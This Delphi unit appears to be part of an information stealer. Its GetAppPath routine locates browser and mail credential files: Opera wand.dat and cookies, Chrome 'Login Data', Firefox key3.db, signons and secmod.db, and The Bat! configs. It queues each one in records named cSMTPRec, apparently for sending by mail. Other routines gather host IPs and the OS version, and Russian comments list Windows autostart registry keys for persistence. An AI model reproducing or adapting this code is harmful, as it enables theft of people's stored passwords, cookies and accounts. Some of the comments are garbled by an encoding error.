unit uGetAppPath;

interface
uses
  classes, uPathMng,  sysutils,  shlObj, windows, Registry, Winsock;

type
  cSMTPRec = class
    path:string;
    name:string;
  end;

procedure GetAppPath(strList:tstringlist);
function GetOS:string;
function IP:string;
function ips: String;
function IsConnectedToInternet: Boolean;
//1.HKLM\Software\Microsoft\Windows\CurrentVersion\Run Ц отсюда
// программы, запускаемые при входе в систему любого юзера.
//2.HKCU\Software\Microsoft\Windows\Current\Version\Run Ц место
// аналогично предыдущему, за исключением того, что отсюда стартует
// дл€ текущего пользовател€.
//3.HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices Ц
// запускаемых до входа пользователей в систему.
//4.HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run Ц этот раздел реестра отвечает за старт программ, добавленных в автозагрузку через групповые политики.
//5.HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows Ц еще одно место, содержащее список программ, загружаемых вместе с Windows.
//6. KHLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon Ц в этой ветке указываетс€ ссылка на винлогон, но ничего не мешает указать и путь до своей программы.
//7. ѕапка автозагрузки. ѕожалуй, самый примитивный способ, но тем немее, многие вирусописатели им пользуютс€.

const
INTERNET_CONNECTION_MODEM = 1;
INTERNET_CONNECTION_LAN = 2;
INTERNET_CONNECTION_PROXY = 4;
INTERNET_CONNECTION_MODEM_BUSY = 8;

implementation

function IsConnectedToInternet: Boolean;
const
  WininetDLL = 'wininet.dll';
var
  hWininetDLL: THandle;
  dwReserved: DWORD;
  lpdwFlags:dword;
  fn_InternetGetConnectedState: function(lpdwFlags: LPDWORD; dwReserved: DWORD): BOOL; stdcall;
begin
  Result := False;

  lpdwFlags := INTERNET_CONNECTION_MODEM +INTERNET_CONNECTION_LAN +INTERNET_CONNECTION_PROXY;

  dwReserved := 0;
  hWininetDLL := LoadLibrary(WininetDLL);
  if hWininetDLL > 0 then
  begin
  @fn_InternetGetConnectedState := GetProcAddress(hWininetDLL,'InternetGetConnectedState');
  if Assigned(fn_InternetGetConnectedState) then
  begin
  Result := fn_InternetGetConnectedState(@lpdwFlags, dwReserved);
  end;
  FreeLibrary(hWininetDLL);
  end else
  raise Exception.Create('Unable to locate function InternetGetConnectedState in library ' + WininetDLL);
end;

function ip: String;
var
  WSAData: TWSAData;
  name: array [0..$ff] of ansiChar;
  HostEnt: PHostEnt;
begin
  Result:='';
  if WSAStartup(MakeWord(2, 2), WSAData)<>0 then Exit;
  if gethostname(name, Length(name))=0 then
  begin
    HostEnt:=gethostbyname(name);
    if HostEnt<>nil then Result:=inet_ntoa(PInAddr(HostEnt^.h_addr_list^)^);
  end;
  WSACleanup;
end;

function ips: String;
type
  TArrPInAddr = array [0..7] of PInAddr;
  PArrPInAddr = ^TArrPInAddr;
var
  WSAData: TWSAData;
  name: array [0..$ff] of AnsiChar;
  HostEnt: PHostEnt;
  ArrPInAddr: PArrPInAddr;
  i: Integer;
begin
  Result:='';
  if WSAStartup(MakeWord(1, 1), WSAData)<>0 then Exit;
  if gethostname(name, Length(name))=0 then
  begin
    HostEnt:=gethostbyname(name);
    if HostEnt<>nil then
    begin
      ArrPInAddr:=PArrPInAddr(HostEnt^.h_addr_list);
      i:=0;
      while ArrPInAddr^[i]<>nil do
      begin
        Result:=Result+StrPas(inet_ntoa(ArrPInAddr^[i]^))+';';
        Inc(i);
      end;
    end;
  end;
  WSACleanup;
end;

function GetSpecialPath(CSIDL: Word): string;
var
  s: string;
begin
  SetLength(s, MAX_PATH);
  if not SHGetSpecialFolderPath(0, PChar(s), CSIDL, True) then
    s := '';
  Result := PChar(s);
end;

function GetOS:string;
var str:string;
    VersionInformation:OSVERSIONINFO;
begin
  VersionInformation.dwOSVersionInfoSize:=sizeof(VersionInformation);
  GetVersionEx(VersionInformation);
  str:='OS Version '+
  intToStr(VersionInformation.dwMajorVersion)+'.'+
  intToStr(VersionInformation.dwMinorVersion)+' '+VersionInformation.szCSDVersion;
  Result:=str;
end;

procedure GetAppPath(strList:tstringlist);
var
  MozillaSignons, theBatList:tstringlist;
  I: Integer;

  PassReaded:boolean;
  rec:cSMTPRec;
  local, userpath, str, mz:string;

  Reg:Tregistry;
begin
  MozillaSignons:=nil;
  theBatList:=nil;

  userPath:= GetSpecialPath(CSIDL_APPDATA);
  local:= GetSpecialPath($1c);
  // opea_wd
  str:=userPath +'\Opera\Opera\wand.dat';
  if fileexists(str) then
  begin
    rec:=cSMTPRec.create;
    rec.name:='opera_wd';
    rec.path:=str;
    strList.AddObject(str,rec);
  end;
  //opera_cookies;
  str:=userPath +'\Opera\Opera\cookies4.dat';
  if fileexists(str) then
  begin
    rec:=cSMTPRec.create;
    rec.name:='opera_cookies4';
    rec.path:=str;
    strList.AddObject(str,rec);
  end;
  //operaProfile_wd;
  str:=userPath +'\Opera\Opera\profile\wand.dat';
  if fileexists(str) then
  begin
    rec:=cSMTPRec.create;
    rec.name:='opera_profile_wd';
    rec.path:=str;
    strList.AddObject(str,rec);
  end;
  //operaProfile_cookies;
  str:=userPath +'\Opera\Opera\profile\cookies4.dat';
  if fileexists(str) then
  begin
    rec:=cSMTPRec.create;
    rec.name:='opera_profile_cookies';
    rec.path:=str;
    strList.AddObject(str,rec);
  end;
  //google_LD;
  str:=local +'\Google\Chrome\User Data\Default\Login Data';
  if fileexists(str) then
  begin
    rec:=cSMTPRec.create;
    rec.name:='google_LD';
    rec.path:=str;
    strList.AddObject(str,rec);
  end;
  // the bat
  reg:=TRegistry.create;
  reg.RootKey:=HKEY_CURRENT_USER;
  // false - если ключа нет то не создавать его
  if reg.OpenKey('Environment',false) then
  begin
    if reg.ValueExists('EMAIL') then
    begin
      str:=reg.ReadString('EMAIL');
    end;
    reg.CloseKey;
    if DirectoryExists(str) then
    begin
      theBatList:=tstringlist.create;
      FindFileExt('.CFN',str,2,theBatList);
      for I := 0 to theBatList.Count - 1 do
      begin
        rec:=cSMTPrec.Create;
        rec.name:='theBat_'+extractfilename(theBatList.Strings[i]);
        rec.path:=theBatList.Strings[i];
        strList.AddObject(theBatList.Strings[i],rec);
      end;
    end;
  end;
  reg.Destroy;

  //mozilla_Data;
  str:=userPath +'\Mozilla\Firefox\Profiles\';
  if DirectoryExists(str) then
  begin
    //  пароли
    mz:=findfile('key3.db',str,2);
    if fileexists(mz) then
    begin
      rec:=cSMTPRec.create;
      rec.name:='MozillaFirefox_Keys';
      rec.path:=mz;
      strList.AddObject(mz,rec);
    end;
    MozillaSignons:=tstringlist.create;
    // шифрование паролей
    FindFileExt('signons',str,2,MozillaSignons);
    for I := 0 to MozillaSignons.Count - 1 do
    begin
      rec:=cSMTPrec.Create;
      rec.name:='Mozilla_'+extractfilename(MozillaSignons.Strings[i]);
      rec.path:=MozillaSignons.Strings[i];
      strList.AddObject(MozillaSignons.Strings[i],rec);
    end;
    // шифрование паролей
    mz:=findfile('secmod.db',str,2);
    if fileexists(mz) then
    begin
      rec:=cSMTPRec.create;
      rec.name:='MozillaFirefox_secmod.db';
      rec.path:=mz;
      strList.AddObject(mz,rec);
    end;
    // вкладки
    //mz:=findfile('places.sqlite',str,2);
    //if fileexists(mz) then
    //begin
    //  rec:=cSMTPRec.create;
    //  rec.name:='MozillaFirefox_places';
    //  rec.path:=mz;
    //  alllist.AddObject(mz,rec);
    //end;
  end;
end;


end.
